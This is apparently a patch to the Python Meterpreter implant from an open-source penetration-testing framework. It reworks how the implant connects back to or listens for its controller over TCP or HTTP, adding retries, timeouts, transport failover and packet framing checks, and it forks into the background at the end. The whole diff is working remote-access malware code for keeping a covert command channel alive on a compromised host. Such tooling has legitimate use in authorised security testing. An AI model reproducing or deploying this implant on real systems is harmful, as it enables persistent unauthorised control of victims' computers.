@@ -77,9 +77,6 @@ PACKET_TYPE_RESPONSE       = 1
 PACKET_TYPE_PLAIN_REQUEST  = 10
 PACKET_TYPE_PLAIN_RESPONSE = 11
 
-STAGE_END_MARKER = bytes('### meterpreter stage end ###\n')
-STAGE_START_MARKER = bytes('#!/usr/b')
-
 ERROR_SUCCESS = 0
 # not defined in original C implementation
 ERROR_FAILURE = 1
@@ -409,9 +406,16 @@ class Transport(object):
 	def __init__(self):
 		self.communication_timeout = SESSION_COMMUNICATION_TIMEOUT
 		self.communication_last = 0
-		self.communication_active = True
+		self.communication_active = False
 		self.retry_total = SESSION_RETRY_TOTAL
 		self.retry_wait = SESSION_RETRY_WAIT
+
+	def __repr__(self):
+		return "<{0} url='{1}' >".format(self.__class__.__name__, self.url)
+
+	@property
+	def communication_has_expired(self):
+		return self.communication_last + self.communication_timeout < time.time()
 
 	@staticmethod
 	def from_request(request):
@@ -427,30 +431,55 @@ class Transport(object):
 		transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
 		return transport
 
+	def _activate(self):
+		return True
+
 	def activate(self):
+		end_time = time.time() + self.retry_total
+		while time.time() < end_time:
+			try:
+				activate_succeeded = self._activate()
+			except:
+				activate_succeeded = False
+			if activate_succeeded:
+				self.communication_last = time.time()
+				self.communication_active = True
+				return True
+			time.sleep(self.retry_wait)
+		return False
+
+	def _deactivate(self):
 		return
 
 	def deactivate(self):
-		return
+		try:
+			self._deactivate()
+		except:
+			pass
+		self.communication_last = 0
+		self.communication_active = False
+		return True
 
 	def get_packet(self):
-		self.communication_active = False
 		try:
 			pkt = self._get_packet()
 		except:
+			self.communication_active = False
 			return None
-		self.communication_active = True
-		self.communication_last = time.time()
+		if pkt:
+			self.communication_active = True
+			self.communication_last = time.time()
 		return pkt
 
 	def send_packet(self, pkt):
-		self.communication_active = False
 		try:
 			self._send_packet(pkt)
 		except:
-			return None
+			self.communication_active = False
+			return False
 		self.communication_active = True
 		self.communication_last = time.time()
+		return True
 
 	def tlv_pack_timeouts(self):
 		response  = tlv_pack(TLV_TYPE_TRANS_COMM_TIMEOUT, self.communication_timeout)
@@ -484,19 +513,32 @@ class HttpTransport(Transport):
 		urllib.install_opener(opener)
 		self.url = url
 		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
+		self._first_packet = None
+
+	def _activate(self):
+		return True
+		self._first_packet = None
+		packet = self._get_packet()
+		if packet is None:
+			return False
+		self._first_packet = packet
+		return True
 
 	def _get_packet(self):
+		if self._first_packet:
+			packet = self._first_packet
+			self._first_packet = None
+			return packet
 		packet = None
 		request = urllib.Request(self.url, bytes('RECV', 'UTF-8'), self._http_request_headers)
 		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
 		packet = url_h.read()
-		if packet:
-			if packet[8:] == STAGE_START_MARKER:
-				return _get_packet()
-			packet = packet[8:]
-		else:
-			packet = None
-		return packet
+		if not packet or len(packet) < 8:
+			return None
+		pkt_length, _ = struct.unpack('>II', packet[:8])
+		if len(packet) != pkt_length:
+			return None
+		return packet[8:]
 
 	def _send_packet(self, packet):
 		request = urllib.Request(self.url, packet, self._http_request_headers)
@@ -517,6 +559,7 @@ class TcpTransport(Transport):
 		self.url = url
 		self.socket = socket
 		self._cleanup_thread = None
+		self._first_packet = True
 
 	def _sock_cleanup(self, sock):
 		remaining_time = self.communication_timeout
@@ -528,9 +571,7 @@ class TcpTransport(Transport):
 			remaining_time -= time.time() - iter_start_time
 		sock.close()
 
-	def activate(self):
-		if self.socket:
-			return
+	def _activate(self):
 		if self.url.startswith('tcp:'):
 			family = socket.AF_INET
 			address, port = self.url[6:].split(':', 1)
@@ -538,6 +579,7 @@ class TcpTransport(Transport):
 			family = socket.AF_INET6
 			address, port = self.url[7:].split(':', 1)
 		port = int(port.rstrip('/'))
+		timeout = max(self.communication_timeout, 30)
 		if address in ('', '0.0.0.0', '::'):
 			try:
 				server_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
@@ -546,34 +588,41 @@ class TcpTransport(Transport):
 				server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			server_sock.bind(('', port))
 			server_sock.listen(1)
-			if not select.select([server_sock], [], [], self.communication_timeout)[0]:
-				raise RuntimeError('connection timed out')
+			if not select.select([server_sock], [], [], timeout)[0]:
+				server_sock.close()
+				return False
 			sock, _ = server_sock.accept()
 			server_sock.close()
 		else:
 			sock = socket.socket(family, socket.SOCK_STREAM)
+			sock.settimeout(timeout)
 			sock.connect((address, port))
+			sock.settimeout(None)
 		self.socket = sock
-		return
+		self._first_packet = True
+		return True
 
-	def deactivate(self):
-		if not self.socket:
-			return
+	def _deactivate(self):
 		cleanup = threading.Thread(target=self._sock_cleanup, args=(self.socket,))
 		cleanup.run()
 		self.socket = None
 
 	def _get_packet(self):
 		packet = None
-		if select.select([self.socket], [], [], self.communication_timeout)[0]:
+		first = self._first_packet
+		self._first_packet = False
+		if select.select([self.socket], [], [], max(self.communication_timeout, 0.5))[0]:
 			packet = self.socket.recv(8)
 			if len(packet) != 8:
+				if first and len(packet) == 4:
+					received = 0
+					pkt_length = struct.unpack('>I', packet)[0]
+					self.socket.settimeout(max(self.communication_timeout, 30))
+					while received < pkt_length:
+						received += len(self.socket.recv(pkt_length - received))
+					self.socket.settimeout(None)
+					return self._get_packet()
 				return None
-			if packet == STAGE_START_MARKER:
-				while self.socket.recv(len(STAGE_END_MARKER), socket.MSG_PEEK) != STAGE_END_MARKER:
-					self.socket.recv(1)
-				self.socket.recv(len(STAGE_END_MARKER))
-				return self._get_packet()
 			pkt_length, pkt_type = struct.unpack('>II', packet)
 			pkt_length -= 8
 			packet = bytes()
@@ -601,7 +650,6 @@ class TcpTransport(Transport):
 class PythonMeterpreter(object):
 	def __init__(self, transport):
 		self.transport = transport
-		self.transport.activate()
 		self.running = False
 		self.last_registered_extension = None
 		self.extension_functions = {}
@@ -648,13 +696,21 @@ class PythonMeterpreter(object):
 		return idx
 
 	def get_packet(self):
-		return self.transport.get_packet()
+		pkt = self.transport.get_packet()
+		if pkt is None and self.transport.communication_has_expired:
+			self.transport_change()
+		return pkt
 
 	def send_packet(self, packet):
-		self.transport.send_packet(packet)
+		send_succeeded = self.transport.send_packet(packet)
+		if not send_succeeded and self.transport.communication_has_expired:
+			self.transport_change()
+		return send_succeeded
 
 	@property
 	def session_has_expired(self):
+		if self.session_expiry_time == 0:
+			return False
 		return time.time() > self.session_expiry_end
 
 	def transport_change(self, new_transport=None):
@@ -663,7 +719,10 @@ class PythonMeterpreter(object):
 		if new_transport is None:
 			new_transport = self.transport_next()
 		self.transport.deactivate()
-		new_transport.activate()
+		self.debug_print('[*] changing transport to: ' + new_transport.url)
+		while not new_transport.activate():
+			new_transport = self.transport_next(new_transport)
+			self.debug_print('[*] changing transport to: ' + new_transport.url)
 		self.transport = new_transport
 
 	def transport_next(self, current_transport=None):
@@ -685,7 +744,7 @@ class PythonMeterpreter(object):
 	def run(self):
 		while self.running and not self.session_has_expired:
 			request = None
-			should_get_packet = self.transport.communication_active or ((time.time() - self.transport.communication_last) > 0.5)
+			should_get_packet = self.transport.communication_active or ((time.time() - self.transport.communication_last) > 1)
 			if should_get_packet:
 				request = self.get_packet()
 			if request:
@@ -827,7 +886,8 @@ class PythonMeterpreter(object):
 		return None
 
 	def _core_transport_list(self, request, response):
-		response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
+		if self.session_expiry_time > 0:
+			response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
 		response += tlv_pack(TLV_TYPE_TRANS_GROUP, self.transport.tlv_pack_transport_group())
 
 		transport = self.transport_next()
@@ -862,7 +922,7 @@ class PythonMeterpreter(object):
 
 	def _core_transport_set_timeouts(self, request, response):
 		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
-		if timeout_value:
+		if not timeout_value is None:
 			self.session_expiry_time = timeout_value
 			self.session_expiry_end = time.time() + self.session_expiry_time
 		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value')
@@ -875,7 +935,8 @@ class PythonMeterpreter(object):
 		if retry_value:
 			self.transport.retry_wait = retry_value
 
-		response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
+		if self.session_expiry_time > 0:
+			response += tlv_pack(TLV_TYPE_TRANS_SESSION_EXP, self.session_expiry_end - time.time())
 		response += self.transport.tlv_pack_timeouts()
 		return ERROR_SUCCESS, response
 
@@ -885,7 +946,8 @@ class PythonMeterpreter(object):
 		if seconds:
 			self.transport.deactivate()
 			time.sleep(seconds)
-			self.transport.activate()
+			if not self.transport.activate():
+				self.transport_change()
 		return None
 
 	def _core_channel_open(self, request, response):
@@ -1027,5 +1089,3 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 		transport = TcpTransport.from_socket(s)
 	met = PythonMeterpreter(transport)
 	met.run()
-
-### meterpreter stage end ###
